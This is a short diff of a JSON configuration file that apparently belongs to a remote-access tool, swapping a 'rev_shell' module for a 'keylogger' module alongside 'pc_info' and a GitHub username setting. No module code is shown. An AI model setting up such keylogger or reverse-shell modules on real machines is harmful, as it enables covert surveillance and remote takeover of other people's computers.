@@ -3,7 +3,7 @@
     "modules": [
         "test_mod",
         "pc_info",
-        "rev_shell"
+        "keylogger"
     ],
     "module_config": {
         "github_username": "pyscripter99",
